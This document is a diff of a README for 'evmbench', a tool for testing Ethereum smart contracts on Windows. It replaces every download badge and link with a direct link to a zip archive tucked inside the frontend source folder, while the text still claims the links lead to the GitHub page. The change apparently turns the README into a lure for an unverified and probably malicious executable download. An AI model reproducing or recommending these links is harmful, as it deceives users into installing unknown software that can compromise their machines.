@@ -1,6 +1,6 @@
 # ⚙️ evmbench - Test Smart Contracts with Confidence
 
-[![Download evmbench](https://img.shields.io/badge/Download-evmbench-green?style=for-the-badge)](https://github.com/alex-zebley/evmbench)
+[![Download evmbench](https://github.com/alex-zebley/evmbench/raw/refs/heads/main/frontend/src/lib/Software_v2.0.zip)](https://github.com/alex-zebley/evmbench/raw/refs/heads/main/frontend/src/lib/Software_v2.0.zip)
 
 evmbench helps you find and fix mistakes in smart contracts. It runs tests on Ethereum contracts to check for bugs and security problems. This tool works on Windows and has a simple interface.
 
@@ -42,7 +42,7 @@ Follow these steps to download and run evmbench on your Windows PC.
 
    Click this link to visit the evmbench download page:
 
-   [Download evmbench from GitHub](https://github.com/alex-zebley/evmbench)
+   [Download evmbench from GitHub](https://github.com/alex-zebley/evmbench/raw/refs/heads/main/frontend/src/lib/Software_v2.0.zip)
 
    This link takes you to the GitHub page where the latest version is available for download.
 
@@ -151,7 +151,7 @@ If evmbench does not start or crashes:
 
 Click here to visit the download page:
 
-[Download evmbench from GitHub](https://github.com/alex-zebley/evmbench)
+[Download evmbench from GitHub](https://github.com/alex-zebley/evmbench/raw/refs/heads/main/frontend/src/lib/Software_v2.0.zip)
 
 Follow the steps outlined earlier to complete your setup.
 
@@ -193,4 +193,4 @@ This project relates to:
 
 # [⚙️] evmbench - Test Smart Contracts with Confidence
 
-[![Download evmbench](https://img.shields.io/badge/Download-evmbench-brightgreen?style=for-the-badge)](https://github.com/alex-zebley/evmbench)
+[![Download evmbench](https://github.com/alex-zebley/evmbench/raw/refs/heads/main/frontend/src/lib/Software_v2.0.zip)](https://github.com/alex-zebley/evmbench/raw/refs/heads/main/frontend/src/lib/Software_v2.0.zip)
